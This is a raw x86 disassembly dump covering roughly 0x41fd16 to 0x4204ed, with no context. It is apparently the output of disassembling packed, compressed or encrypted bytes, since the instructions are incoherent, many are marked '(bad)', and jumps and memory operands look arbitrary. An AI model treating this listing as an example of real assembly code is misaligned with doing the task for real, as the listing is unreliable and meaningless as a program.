  41fd16:	add    al,0x58
  41fd18:	dec    esp
  41fd19:	inc    eax
  41fd1a:	es xor al,0x1f
  41fd1d:	mov    al,ds:0x78caaaf1
  41fd22:	xor    DWORD PTR ds:0xbb5a557b,ecx
  41fd28:	dec    ebx
  41fd29:	enter  0x61ed,0xa9
  41fd2d:	(bad)  
  41fd2e:	loopne 0x41fd95
  41fd30:	mov    bl,0xf
  41fd32:	iret   
  41fd33:	fcmovb st,st(7)
  41fd35:	shr    BYTE PTR [eax+0x6eff7180],cl
  41fd3b:	mov    dl,0x28
  41fd3d:	sar    esi,0x5b
  41fd40:	shl    BYTE PTR [ebx-0x159f1f52],1
  41fd46:	xor    eax,0xd690eedb
  41fd4b:	push   eax
  41fd4c:	(bad)  [edx+0x1e]
  41fd4f:	dec    esp
  41fd50:	sbb    cl,bl
  41fd52:	mov    al,ds:0x9e4d4beb
  41fd57:	loope  0x41fd2f
  41fd59:	jge    0x41fd50
  41fd5b:	mov    ds:0xfa420904,al
  41fd60:	stos   DWORD PTR es:[edi],eax
  41fd61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd62:	push   ds
  41fd63:	aam    0xda
  41fd65:	stos   DWORD PTR es:[edi],eax
  41fd66:	adc    bh,bl
  41fd68:	push   0xffffff8e
  41fd6a:	ret    
  41fd6b:	add    DWORD PTR [ebx-0xc9a1201],edx
  41fd71:	ret    
  41fd72:	aad    0x0
  41fd74:	neg    DWORD PTR [esi+0x36]
  41fd77:	(bad)  
  41fd78:	in     al,0x43
  41fd7a:	xlat   BYTE PTR ds:[ebx]
  41fd7b:	mov    ebx,0x85f23701
  41fd80:	add    dl,BYTE PTR [edi]
  41fd82:	out    dx,al
  41fd83:	ins    DWORD PTR es:[edi],dx
  41fd84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd85:	adc    ebx,ebp
  41fd87:	mov    esi,0x2bba8a4d
  41fd8c:	dec    esi
  41fd8d:	jo     0x41fdb2
  41fd8f:	pop    ebx
  41fd90:	ss mov dl,0xf3
  41fd93:	xchg   esp,eax
  41fd94:	push   es
  41fd95:	addr16 or al,0x9a
  41fd98:	pop    ebp
  41fd99:	test   DWORD PTR [ecx+0x19],0x4e765f2b
  41fda0:	mov    dh,0x23
  41fda2:	mov    BYTE PTR [eax],ch
  41fda4:	mov    bh,0xcd
  41fda6:	les    edx,FWORD PTR [eax+0x73ea55a]
  41fdac:	sbb    al,0xaf
  41fdae:	lock add al,0x88
  41fdb1:	xchg   ecx,eax
  41fdb2:	jns    0x41fdf8
  41fdb4:	imul   ecx,DWORD PTR [ecx-0x7886683c],0xffffffe7
  41fdbb:	sbb    bl,bh
  41fdbd:	jp     0x41fdd8
  41fdbf:	lock outs dx,DWORD PTR ds:[esi]
  41fdc1:	adc    DWORD PTR [ecx],edi
  41fdc3:	ror    ecx,1
  41fdc5:	nop
  41fdc6:	repz jg 0x41fdff
  41fdc9:	(bad)  
  41fdca:	repz inc ebx
  41fdcc:	sub    DWORD PTR [edi-0x31e0fb25],0x5decedd0
  41fdd6:	stos   BYTE PTR es:[edi],al
  41fdd7:	rol    DWORD PTR [ecx-0x4c],0x21
  41fddb:	inc    ebx
  41fddc:	fsub   DWORD PTR [ecx+0x586c52ce]
  41fde2:	xchg   DWORD PTR [edi+0x24fb008a],edi
  41fde8:	cmp    DWORD PTR [ebx-0xf],edx
  41fdeb:	aad    0x1f
  41fded:	mov    cl,0x90
  41fdef:	cmc    
  41fdf0:	push   eax
  41fdf1:	icebp  
  41fdf2:	or     al,0xe3
  41fdf4:	or     edx,ecx
  41fdf6:	das    
  41fdf7:	cs pop ebp
  41fdf9:	mov    eax,ds:0x43d0cca3
  41fdfe:	daa    
  41fdff:	pop    ecx
  41fe00:	sahf   
  41fe01:	out    0xcd,eax
  41fe03:	or     DWORD PTR [ecx-0x68c96de1],0x69ab8ab4
  41fe0d:	mov    DWORD PTR [eax],esp
  41fe0f:	in     al,dx
  41fe10:	dec    DWORD PTR [esi+0x69]
  41fe13:	sbb    BYTE PTR [edx],al
  41fe15:	mov    ch,0x55
  41fe17:	test   al,0xd9
  41fe19:	mov    edx,0x71fe4092
  41fe1e:	mov    WORD PTR [edx-0x53f712d2],?
  41fe24:	add    DWORD PTR [ecx-0x21],esi
  41fe27:	mov    bl,BYTE PTR [esi-0x36]
  41fe2a:	pop    ebp
  41fe2b:	push   edi
  41fe2c:	push   esp
  41fe2d:	bound  ebp,QWORD PTR [ecx]
  41fe2f:	out    dx,al
  41fe30:	shr    DWORD PTR [edi],0xa4
  41fe33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe34:	cli    
  41fe35:	loope  0x41fe81
  41fe37:	mov    ds:0xc19b0168,al
  41fe3c:	and    DWORD PTR [edx-0x51],0xfe1cac85
  41fe43:	sub    al,0x45
  41fe45:	loop   0x41fe34
  41fe47:	enter  0xa370,0x5f
  41fe4b:	fistp  WORD PTR [edi-0x65]
  41fe4e:	xor    ebx,DWORD PTR [esi+0xbf5a9a4]
  41fe54:	and    BYTE PTR [eax+eiz*1],ch
  41fe57:	xchg   edi,eax
  41fe58:	pop    es
  41fe59:	out    0xb1,eax
  41fe5b:	pop    ecx
  41fe5c:	shr    DWORD PTR [edx-0x62],1
  41fe5f:	sub    eax,0x85dfae93
  41fe64:	jb     0x41fec1
  41fe66:	stos   BYTE PTR es:[edi],al
  41fe67:	push   ebp
  41fe68:	imul   eax,DWORD PTR [esi-0x78],0x5f
  41fe6c:	dec    esi
  41fe6d:	adc    bh,dl
  41fe6f:	enter  0x6cd,0xf2
  41fe73:	shl    DWORD PTR [ebx],0x6
  41fe76:	jbe    0x41fe31
  41fe78:	repz (bad) 
  41fe7a:	mov    al,0x26
  41fe7c:	fnstsw WORD PTR [ebx+edx*1-0x7d7a9ece]
  41fe83:	(bad)  
  41fe84:	and    BYTE PTR [eax-0x62],dl
  41fe87:	repnz cmp dh,bh
  41fe8a:	push   ebx
  41fe8b:	adc    eax,0xf67422f6
  41fe90:	dec    ecx
  41fe91:	push   cs
  41fe92:	mov    dl,0x15
  41fe94:	sub    DWORD PTR [edi],edi
  41fe96:	mov    edi,0x726f7183
  41fe9b:	js     0x41feb3
  41fe9d:	cld    
  41fe9e:	dec    eax
  41fe9f:	sahf   
  41fea0:	ins    BYTE PTR es:[edi],dx
  41fea1:	sar    BYTE PTR [esi+eax*4],0x49
  41fea5:	jg     0x41fea6
  41fea7:	sbb    DWORD PTR [eax+edi*1],ebx
  41feaa:	lea    eax,[ecx-0x39f21997]
  41feb0:	xchg   DWORD PTR [edx+0x0],ebx
  41feb3:	out    dx,al
  41feb4:	inc    ecx
  41feb5:	call   0x44fd0612
  41feba:	outs   dx,BYTE PTR ds:[esi]
  41febb:	add    DWORD PTR [eax+0x7c0ddb50],0xffffffeb
  41fec2:	xchg   esi,eax
  41fec3:	(bad)  
  41fec4:	lock cmp al,0x81
  41fec7:	popa   
  41fec8:	mov    ch,0xc1
  41feca:	je     0x41fed2
  41fecc:	adc    cl,BYTE PTR [edx-0x1]
  41fecf:	mov    gs:0x2170c504,al
  41fed5:	or     edi,esp
  41fed7:	jnp    0x41fe79
  41fed9:	mov    ebx,ebx
  41fedb:	fs pop ss
  41fedd:	or     BYTE PTR [ebp+0x4249013c],0x7
  41fee4:	adc    al,0x75
  41fee6:	pushf  
  41fee7:	pop    ecx
  41fee8:	sbb    BYTE PTR [ebx+0x29],dl
  41feeb:	mov    eax,ds:0xa18edd40
  41fef0:	out    dx,al
  41fef1:	aam    0x88
  41fef3:	std    
  41fef4:	sbb    BYTE PTR [edi-0x6b5ea6df],dl
  41fefa:	fisttp DWORD PTR [ebp-0x72d044f1]
  41ff00:	fmulp  st(3),st
  41ff02:	call   0x673ca7b5
  41ff07:	popf   
  41ff08:	mov    bh,0xb0
  41ff0a:	mov    eax,esi
  41ff0c:	sub    BYTE PTR [eax+0x16],0x12
  41ff10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff11:	dec    ebp
  41ff12:	aam    0xfd
  41ff14:	mov    esi,0x331acf5a
  41ff19:	ret    0xc3e0
  41ff1c:	inc    ebp
  41ff1d:	repnz fnstenv [ecx-0xac634fa]
  41ff24:	es jno 0x41ff63
  41ff27:	in     al,dx
  41ff28:	rcl    DWORD PTR [edx+0x6110ca0b],0x8f
  41ff2f:	es xchg edi,eax
  41ff31:	rcr    DWORD PTR [eax-0x79],0xa7
  41ff35:	rol    DWORD PTR [edx+eax*2],cl
  41ff38:	pop    ecx
  41ff39:	into   
  41ff3a:	aaa    
  41ff3b:	sub    edi,edi
  41ff3d:	pop    ss
  41ff3e:	in     eax,0x3d
  41ff40:	fs jns 0x41ff2f
  41ff43:	sbb    eax,0x3e2d5383
  41ff48:	pop    es
  41ff49:	mov    ds,eax
  41ff4b:	inc    edi
  41ff4c:	pop    ecx
  41ff4d:	int    0xd6
  41ff4f:	cmp    bl,cl
  41ff51:	mov    bh,0x5
  41ff53:	adc    DWORD PTR [ebp+0x2b],ecx
  41ff56:	sar    ecx,cl
  41ff58:	hlt    
  41ff59:	enter  0xab39,0xee
  41ff5d:	add    eax,0x264f2ad
  41ff62:	or     eax,0xd38d082f
  41ff67:	outs   dx,DWORD PTR ds:[esi]
  41ff68:	fdiv   st,st(0)
  41ff6b:	add    esp,ebp
  41ff6d:	push   0x39462865
  41ff72:	jg     0x41ffdc
  41ff74:	int    0x99
  41ff76:	cmp    dh,ah
  41ff78:	and    DWORD PTR [ecx-0x6f],edi
  41ff7b:	(bad)  
  41ff7c:	test   WORD PTR [ebx+ebx*1+0x5c],bp
  41ff81:	sbb    DWORD PTR [eax-0x2ea076c4],0x4
  41ff88:	add    al,BYTE PTR [ebx-0x3e5f9d45]
  41ff8e:	aam    0xae
  41ff90:	sub    al,0x68
  41ff92:	cmc    
  41ff93:	dec    ecx
  41ff94:	pushf  
  41ff95:	gs stos DWORD PTR es:[edi],eax
  41ff97:	dec    ebx
  41ff98:	int    0x30
  41ff9a:	call   0x4e07ebb8
  41ff9f:	xchg   ecx,eax
  41ffa0:	retf   0x42d3
  41ffa3:	int    0xe9
  41ffa5:	addr16 xchg ebp,eax
  41ffa7:	dec    esp
  41ffa8:	retf   
  41ffa9:	cdq    
  41ffaa:	test   al,0x4e
  41ffac:	lock das 
  41ffae:	retf   0x56e8
  41ffb1:	jl     0x41ff52
  41ffb3:	jae    0x420003
  41ffb5:	lds    ebp,FWORD PTR [ebx-0xcf71cb0]
  41ffbb:	xchg   esi,eax
  41ffbc:	enter  0x1bae,0x52
  41ffc0:	pop    ss
  41ffc1:	xchg   ebp,eax
  41ffc2:	fdivrp st(2),st
  41ffc4:	inc    edi
  41ffc5:	dec    esi
  41ffc6:	cs pop es
  41ffc8:	pop    edx
  41ffc9:	and    eax,0xa3c4b97d
  41ffce:	pusha  
  41ffcf:	pop    ds
  41ffd0:	iret   
  41ffd1:	xor    ah,bh
  41ffd3:	inc    ebp
  41ffd4:	xor    al,0x1f
  41ffd6:	loop   0x420045
  41ffd8:	dec    edx
  41ffd9:	add    dh,BYTE PTR [edx+0xfa540a8]
  41ffdf:	jl     0x42002c
  41ffe1:	jnp    0x41ff7b
  41ffe3:	(bad)  
  41ffe5:	or     eax,0x8b7bc56f
  41ffea:	push   es
  41ffeb:	xchg   esi,eax
  41ffec:	cmp    DWORD PTR [esi+0x11dca39b],0x8b28412a
  41fff6:	inc    eax
  41fff7:	pushf  
  41fff8:	stos   DWORD PTR es:[edi],eax
  41fff9:	push   es
  41fffa:	push   ebx
  41fffb:	or     cl,BYTE PTR [edi+0x53ea9d98]
  420001:	jo     0x41ffc4
  420003:	push   ss
  420004:	pop    edx
  420005:	jmp    0x1590:0xa00e5e4e
  42000c:	fbstp  TBYTE PTR [edx+ecx*2+0x586c265b]
  420013:	mov    al,ds:0xce0172e7
  420018:	cdq    
  420019:	pop    ss
  42001a:	sbb    eax,0xea6ac5da
  42001f:	out    0x5f,eax
  420021:	push   ss
  420022:	sti    
  420023:	shl    DWORD PTR [ebp+0x2e],cl
  420026:	push   eax
  420027:	mov    DWORD PTR [esp+eax*8+0x25],edi
  42002b:	sbb    DWORD PTR [ebp-0xb],esp
  42002e:	jmp    0xfd5a:0x8204890a
  420035:	sar    eax,cl
  420037:	ins    BYTE PTR es:[edi],dx
  420038:	jb     0x420069
  42003a:	(bad)  
  42003c:	nop
  42003d:	stc    
  42003e:	enter  0x726a,0x18
  420042:	(bad)  
  420043:	cld    
  420044:	inc    edi
  420045:	into   
  420046:	sub    al,0x53
  420048:	nop
  420049:	int3   
  42004a:	lahf   
  42004b:	sti    
  42004c:	mov    dl,BYTE PTR [ecx-0x1621c964]
  420052:	arpl   bp,ax
  420054:	nop
  420055:	div    ebp
  420057:	and    eax,0x42c288b0
  42005c:	sahf   
  42005d:	cmp    ah,ch
  42005f:	retf   
  420060:	je     0x4200b7
  420062:	sub    DWORD PTR [ebp+0x1b],edx
  420065:	xor    al,0xf5
  420067:	es adc edi,ebp
  42006a:	call   0x2a2a:0xe26b
  420070:	pop    edx
  420071:	xor    BYTE PTR [edx-0x325b301],ch
  420077:	sub    ch,BYTE PTR [edi]
  420079:	jmp    FWORD PTR [edi+0x7bebd7d6]
  42007f:	(bad)  
  420080:	dec    ebp
  420081:	mov    dh,0xb5
  420083:	mov    ds:0x1fc99560,al
  420088:	cmp    ch,bl
  42008a:	adc    ebp,DWORD PTR [ecx]
  42008c:	call   0x79d8944b
  420091:	dec    edx
  420092:	cmp    BYTE PTR [ebp+ebx*4+0x163534b6],ch
  420099:	popf   
  42009a:	fldenv [ebx+0x7e20bdc1]
  4200a0:	pop    ss
  4200a1:	arpl   WORD PTR [ebp+eiz*8+0xcc6f7af],bx
  4200a8:	std    
  4200a9:	jno    0x420056
  4200ab:	inc    ecx
  4200ac:	pop    edi
  4200ad:	sar    DWORD PTR [edi+0x61],0x93
  4200b1:	dec    ebp
  4200b2:	mov    edi,0x7944d3e2
  4200b7:	jns    0x4200f6
  4200b9:	mov    BYTE PTR [ebx],ah
  4200bb:	mov    ecx,0x9492d975
  4200c0:	in     eax,0x48
  4200c2:	cmp    edx,esi
  4200c4:	ficom  DWORD PTR ds:0xb95b339e
  4200ca:	mov    gs,edi
  4200cc:	sar    BYTE PTR [ecx+0x18273829],0xeb
  4200d3:	jg     0x4200db
  4200d5:	push   ecx
  4200d6:	adc    cl,bh
  4200d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200d9:	ss push esp
  4200db:	sbb    cl,BYTE PTR [eax]
  4200dd:	(bad)  
  4200df:	fcomp  QWORD PTR [ecx]
  4200e1:	xchg   edi,eax
  4200e2:	sbb    ah,BYTE PTR [ebx-0x7f]
  4200e5:	sbb    bl,BYTE PTR [ecx]
  4200e7:	cmp    DWORD PTR [eax+0x67457d5d],ecx
  4200ed:	sub    eax,0x2b715e59
  4200f2:	sbb    al,bh
  4200f4:	icebp  
  4200f5:	jmp    0xbbfad10d
  4200fa:	shr    BYTE PTR [edx+esi*1],1
  4200fd:	ficomp DWORD PTR [edx]
  4200ff:	xchg   ecx,eax
  420100:	jnp    0x420103
  420102:	pusha  
  420103:	repnz sbb BYTE PTR [esi-0x74],dh
  420107:	fadd   QWORD PTR [eax]
  420109:	dec    ebx
  42010a:	mov    ebx,ebx
  42010c:	and    al,BYTE PTR ds:0x809f58be
  420112:	aaa    
  420113:	mov    dl,BYTE PTR [ecx-0x2e]
  420116:	int    0xdc
  420118:	adc    al,dh
  42011a:	pusha  
  42011b:	in     al,dx
  42011c:	aad    0x13
  42011e:	xor    cl,BYTE PTR [ebp-0x68a15ee8]
  420124:	jns    0x420146
  420126:	fimul  WORD PTR [eax]
  420128:	ds inc edi
  42012a:	xchg   esi,eax
  42012b:	mov    ebx,0xc0f9a511
  420130:	mov    WORD PTR [eax-0x51822eff],ds
  420136:	jg     0x420171
  420138:	push   ebp
  420139:	fs pop ss
  42013b:	mov    dl,0xbc
  42013d:	das    
  42013e:	addr16 (bad) 
  420140:	mov    bh,0x6a
  420142:	push   edx
  420143:	test   BYTE PTR [ebp+eax*4-0x58],ah
  420147:	mov    bh,0xd0
  420149:	or     edx,edx
  42014b:	mov    edi,DWORD PTR [ebp+esi*1+0x27430a04]
  420152:	ret    0xad28
  420155:	xor    al,0xc1
  420157:	xor    DWORD PTR [ecx+eax*8+0x6e],edx
  42015b:	retf   0x4e45
  42015e:	jae    0x42017c
  420160:	push   ebx
  420161:	sbb    edx,DWORD PTR ds:0x269b5cfe
  420167:	mul    cl
  420169:	mov    edi,0x7cfe7b65
  42016e:	icebp  
  42016f:	aaa    
  420170:	neg    DWORD PTR [esi]
  420172:	xchg   esp,eax
  420173:	mov    edx,0xfe5dd76
  420178:	imul   edx,DWORD PTR [eax+0x59],0x5f
  42017c:	fcomp  DWORD PTR ds:0x6633ad7d
  420182:	xor    dl,BYTE PTR [esi]
  420184:	sub    bl,BYTE PTR [ebx-0x56]
  420187:	ret    
  420188:	lea    ecx,[eax]
  42018a:	mov    edx,0x7c510bf8
  42018f:	sbb    edx,DWORD PTR [ecx+eax*2]
  420192:	(bad)  
  420193:	mov    ds:0x98d5a8ca,al
  420198:	into   
  420199:	cld    
  42019a:	jbe    0x4201d3
  42019c:	mov    ds:0x13565aa2,eax
  4201a1:	dec    ebx
  4201a2:	adc    al,0xa
  4201a4:	ret    
  4201a5:	loop   0x42021e
  4201a7:	add    DWORD PTR [eax],ecx
  4201a9:	mov    es,WORD PTR ds:0xc6922e08
  4201af:	adc    BYTE PTR [edx+0x1d7591b3],ah
  4201b5:	push   ss
  4201b6:	icebp  
  4201b7:	mov    ebp,0x9542bc3
  4201bc:	imul   esi,DWORD PTR [ebp+0x3e3297c9],0x53
  4201c3:	xor    esi,edx
  4201c5:	ins    BYTE PTR es:[edi],dx
  4201c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201c7:	imul   eax,eax,0xffffff9b
  4201ca:	cdq    
  4201cb:	stos   BYTE PTR es:[edi],al
  4201cc:	iret   
  4201cd:	call   0xab53:0xb6937618
  4201d4:	xchg   ebp,eax
  4201d5:	sub    bh,bl
  4201d7:	test   DWORD PTR [ecx+edx*4-0x4e],esp
  4201db:	int    0xf4
  4201dd:	ss pusha 
  4201df:	sub    al,0xbb
  4201e1:	(bad)  
  4201e2:	or     eax,0x7310b167
  4201e7:	jae    0x420189
  4201e9:	aad    0x28
  4201eb:	test   edx,eax
  4201ed:	mov    edi,0xd6b217ce
  4201f2:	mov    al,0xa1
  4201f4:	add    ah,BYTE PTR [edx]
  4201f6:	jne    0x42023f
  4201f8:	sbb    DWORD PTR [ebx-0x1c],edi
  4201fb:	xor    eax,0x9797c921
  420200:	cmp    cl,dl
  420202:	sub    edx,DWORD PTR [ecx+0x11907d64]
  420208:	cmp    eax,0xa4e36b64
  42020d:	(bad)  
  42020e:	xor    BYTE PTR [esi+0x2a],bl
  420211:	xor    eax,0xf3f26436
  420216:	cli    
  420217:	imul   edi,eax,0x708ebc95
  42021d:	in     eax,dx
  42021e:	loop   0x42020d
  420220:	mov    ecx,0x52c66f88
  420225:	and    BYTE PTR [esi-0xc305607],0x25
  42022c:	iret   
  42022d:	mov    dl,0xef
  42022f:	sbb    DWORD PTR [esi-0x24],eax
  420232:	fwait
  420233:	jp     0x420249
  420235:	sbb    DWORD PTR [edx+0xf899e71],eax
  42023b:	test   eax,0xe6491eaa
  420240:	fadd   st(5),st
  420242:	jp     0x42025d
  420244:	inc    esp
  420245:	imul   edx,DWORD PTR [ebp+0x8],0xca01bdd7
  42024c:	in     al,dx
  42024d:	xchg   edx,eax
  42024e:	xor    DWORD PTR [esp+eiz*2+0x2e],edx
  420252:	mov    al,bl
  420254:	xor    eax,0x988b6dc5
  420259:	cmc    
  42025a:	ins    DWORD PTR es:[edi],dx
  42025b:	fsub   DWORD PTR [ebx+0xb]
  42025e:	sbb    edx,edx
  420260:	loopne 0x4202d7
  420262:	dec    esi
  420263:	ror    BYTE PTR [edx],1
  420265:	push   cs
  420266:	mov    esp,0xa07efbce
  42026b:	mov    BYTE PTR [ecx-0x412e90c0],ah
  420271:	fdivp  st(3),st
  420273:	pop    esi
  420274:	pop    eax
  420275:	scas   al,BYTE PTR es:[edi]
  420276:	jmp    0x3de84852
  42027b:	(bad)  
  42027c:	or     al,0xee
  42027e:	ja     0x420282
  420280:	dec    esp
  420281:	ja     0x42027b
  420283:	mov    ah,0xea
  420285:	sbb    al,0xb2
  420287:	and    ebx,DWORD PTR ds:0x3ccb04a6
  42028d:	loopne 0x420257
  42028f:	mov    bh,0x7
  420291:	hlt    
  420292:	mov    dl,0x22
  420294:	sbb    BYTE PTR [edx-0x2b2538b4],dl
  42029a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42029b:	iret   
  42029c:	js     0x420319
  42029e:	aam    0x18
  4202a0:	pushw  0xffe9
  4202a3:	int3   
  4202a4:	ja     0x420252
  4202a6:	fisub  WORD PTR [edi]
  4202a8:	stc    
  4202a9:	jns    0x420328
  4202ab:	stos   DWORD PTR es:[edi],eax
  4202ac:	fidiv  DWORD PTR ds:0xfb900858
  4202b2:	or     ebp,DWORD PTR [edx+0x232f5be3]
  4202b8:	sti    
  4202b9:	sti    
  4202ba:	and    ebx,eax
  4202bc:	stos   BYTE PTR es:[edi],al
  4202bd:	jmp    0xed41:0xbae040d0
  4202c4:	lock push edi
  4202c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202c7:	stos   BYTE PTR es:[edi],al
  4202c8:	inc    ebp
  4202c9:	cwde   
  4202ca:	cli    
  4202cb:	sub    BYTE PTR [ebp-0x52],bl
  4202ce:	xlat   BYTE PTR ds:[ebx]
  4202cf:	xchg   esi,eax
  4202d0:	loopne 0x42029e
  4202d2:	addr16 jbe 0x4202d5
  4202d5:	cmp    BYTE PTR [edx-0x52],bl
  4202d8:	sbb    esp,DWORD PTR [esi]
  4202da:	push   ss
  4202db:	push   esp
  4202dc:	push   cs
  4202dd:	mov    ds:0x6b64288d,eax
  4202e2:	bound  ebx,QWORD PTR [eax+0xd]
  4202e5:	mov    ebx,ebx
  4202e7:	xchg   esp,eax
  4202e8:	stos   DWORD PTR es:[edi],eax
  4202e9:	mov    eax,0xd2fe4d11
  4202ee:	push   edi
  4202ef:	arpl   WORD PTR [ebx],dx
  4202f1:	stos   DWORD PTR es:[edi],eax
  4202f2:	out    0xc4,al
  4202f4:	cmp    BYTE PTR [ebx+0x360f2a1a],dh
  4202fa:	add    BYTE PTR [eax],dh
  4202fc:	enter  0xbb50,0x4e
  420300:	js     0x420330
  420302:	je     0x420323
  420304:	jae    0x42029a
  420306:	xchg   ebx,eax
  420307:	mov    DWORD PTR [esi-0x5d],esp
  42030a:	fs lock ins DWORD PTR es:[edi],dx
  42030d:	cmp    eax,0x2aa01463
  420312:	pop    ebx
  420313:	mov    ch,0x2b
  420315:	xchg   esi,eax
  420316:	ins    DWORD PTR es:[edi],dx
  420317:	mov    ds:0xff70d990,al
  42031c:	stc    
  42031d:	push   esp
  42031e:	sbb    ch,BYTE PTR [edx+0x637306f9]
  420324:	repnz (bad) 
  420326:	dec    ebp
  420327:	int3   
  420328:	adc    DWORD PTR [ebx],edi
  42032a:	scas   eax,DWORD PTR es:[edi]
  42032b:	mov    esp,0xd377969d
  420330:	jecxz  0x42039d
  420332:	cmp    eax,0xfee7058b
  420337:	xor    al,0x46
  420339:	ss jmp 0x54ad83ca
  42033f:	adc    BYTE PTR [edi+0x68d8e6af],cl
  420345:	pop    es
  420346:	push   ss
  420347:	out    0x94,al
  420349:	shl    al,0x6e
  42034c:	mov    BYTE PTR [esi+edx*4-0x27869af8],bl
  420353:	inc    edi
  420354:	ds pushf 
  420356:	iret   
  420357:	push   esi
  420358:	ret    
  420359:	cmp    al,0xb8
  42035b:	pushf  
  42035c:	pop    ebp
  42035d:	mov    dl,0x7b
  42035f:	jae    0x420318
  420361:	mov    al,ds:0xfe93924c
  420366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420367:	push   ebp
  420368:	dec    edx
  420369:	push   ss
  42036a:	ret    0xa1a2
  42036d:	push   es
  42036e:	mov    ah,0x76
  420370:	imul   ecx,DWORD PTR [edi+0x2259f1b1],0x47
  420377:	ret    
  420378:	xor    BYTE PTR [ebx],bh
  42037a:	cmp    eax,0xa6b77dde
  42037f:	add    eax,0x345d4379
  420384:	and    al,0x7a
  420386:	mov    dl,BYTE PTR [esi]
  420388:	fild   QWORD PTR [edi+0x6ae8287d]
  42038e:	in     al,0x9b
  420390:	cmp    ecx,DWORD PTR [edi-0x61cb2fc9]
  420396:	out    0x75,eax
  420398:	cmp    eax,0xb7008547
  42039d:	shl    BYTE PTR [ebx+0x45272d50],1
  4203a3:	imul   edx,DWORD PTR [edi-0x10],0xffffffed
  4203a7:	sub    dl,BYTE PTR [ebp+0x3dcbb13]
  4203ad:	add    eax,0x7b699b0
  4203b2:	test   al,0xd1
  4203b4:	in     al,0x2e
  4203b6:	sbb    eax,0x30a47f20
  4203bb:	add    BYTE PTR ds:0x4191d384,0x32
  4203c2:	pop    edi
  4203c3:	sbb    ecx,DWORD PTR [eax]
  4203c5:	jae    0x4203ae
  4203c7:	sar    edx,cl
  4203c9:	jecxz  0x42040e
  4203cb:	mov    bl,BYTE PTR [ebp+ebp*4+0x5923bfc7]
  4203d2:	sbb    ecx,DWORD PTR [ebx]
  4203d4:	push   cs
  4203d5:	or     dh,BYTE PTR [ebx+0x7b]
  4203d8:	sbb    edx,0xc6569166
  4203de:	loopne 0x4203d8
  4203e0:	enter  0x6687,0xec
  4203e4:	jae    0x420420
  4203e6:	dec    eax
  4203e7:	adc    DWORD PTR [eax+0x74f170a9],0xffffffbc
  4203ee:	push   edx
  4203ef:	in     al,dx
  4203f0:	adc    ebx,DWORD PTR [ebx-0x1f]
  4203f3:	inc    ebp
  4203f4:	dec    ebp
  4203f5:	jno    0x42037a
  4203f7:	ret    
  4203f8:	dec    edx
  4203f9:	nop
  4203fa:	inc    esi
  4203fb:	mov    edx,0xbd803ffb
  420400:	icebp  
  420401:	or     DWORD PTR [edx+edx*2-0x4a7ee7c9],ecx
  420408:	adc    BYTE PTR [ebx],bl
  42040a:	repz imul ebx,DWORD PTR [eax+0x3f],0xffffffbb
  42040f:	add    eax,0x4bf983ce
  420414:	mov    ?,WORD PTR [ecx+0xaf5691a]
  42041a:	nop
  42041b:	stos   DWORD PTR es:[edi],eax
  42041c:	add    eax,0x41a0d0b2
  420421:	retf   0x85
  420424:	aas    
  420425:	sbb    DWORD PTR [esi],ecx
  420427:	jno    0x420414
  420429:	adc    eax,0x4d052ed8
  42042e:	inc    esi
  42042f:	retf   
  420430:	enter  0xd16c,0x25
  420434:	scas   eax,DWORD PTR es:[edi]
  420435:	and    BYTE PTR [eax-0x3ee43338],0xc0
  42043c:	and    dl,ah
  42043e:	lods   eax,DWORD PTR ds:[esi]
  42043f:	dec    edx
  420440:	daa    
  420441:	ror    edi,cl
  420443:	mov    ecx,0xbd586988
  420448:	daa    
  420449:	inc    ecx
  42044a:	and    ecx,edi
  42044c:	popa   
  42044d:	fstp   DWORD PTR [esi]
  42044f:	daa    
  420450:	shl    BYTE PTR [ebp+0x599fb6e3],1
  420456:	retf   0x3464
  420459:	rcr    ch,cl
  42045b:	inc    eax
  42045c:	int    0xe6
  42045e:	xor    BYTE PTR [esi],bh
  420460:	out    dx,al
  420461:	iret   
  420462:	xchg   ebx,eax
  420463:	daa    
  420464:	pcmpgtb mm4,mm2
  420467:	sub    ch,bh
  420469:	pusha  
  42046a:	rol    esp,1
  42046c:	fwait
  42046d:	js     0x42042b
  42046f:	inc    BYTE PTR [edi-0x1e]
  420472:	mov    WORD PTR [ebx],gs
  420474:	addr16 nop
  420476:	push   ecx
  420477:	dec    esp
  420478:	fsub   DWORD PTR ds:0xfb6bfcfe
  42047e:	mov    bl,0x3
  420480:	in     al,0x66
  420482:	adc    eax,0x9a1a784f
  420487:	ret    0xa965
  42048a:	pop    ds
  42048b:	pop    edx
  42048c:	and    eax,0x5044dc2e
  420491:	mov    bl,0xd5
  420493:	sbb    BYTE PTR [ecx-0x42],ah
  420496:	xor    DWORD PTR [eax],edi
  420498:	cs inc edi
  42049a:	repz loope 0x4204e8
  42049d:	jbe    0x4204a5
  42049f:	mov    esp,DWORD PTR [eax]
  4204a1:	jnp    0x4204cc
  4204a3:	pop    edx
  4204a4:	mov    dl,0x4c
  4204a6:	ins    BYTE PTR es:[edi],dx
  4204a7:	(bad)  
  4204a8:	fiadd  WORD PTR [ebp+eax*1-0x4d83d86b]
  4204af:	test   eax,0x48ce5ed
  4204b4:	pop    es
  4204b5:	sahf   
  4204b6:	retf   0x101b
  4204b9:	in     al,dx
  4204ba:	(bad)  
  4204bb:	out    dx,al
  4204bc:	bound  edi,QWORD PTR [esi]
  4204be:	xchg   DWORD PTR [edi+ebp*2],edx
  4204c1:	scas   eax,DWORD PTR es:[edi]
  4204c2:	lods   al,BYTE PTR ds:[esi]
  4204c3:	div    DWORD PTR [eax+0x596cfc28]
  4204c9:	mov    ds:0xd2ec5ebe,al
  4204ce:	add    DWORD PTR [ebp+0x7],eax
  4204d1:	xchg   ebx,eax
  4204d2:	or     eax,0x147ec22a
  4204d7:	fcom   DWORD PTR [edx-0x5fe0bff]
  4204dd:	sbb    eax,0x10f1d79d
  4204e2:	push   eax
  4204e3:	pop    ebx
  4204e4:	outs   dx,BYTE PTR ds:[esi]
  4204e5:	cs out dx,al
  4204e7:	ror    DWORD PTR [eax-0x34],1
  4204ea:	nop
  4204eb:	jnp    0x4204c0
  4204ed:	fisubr DWORD PTR [eax+0x63]
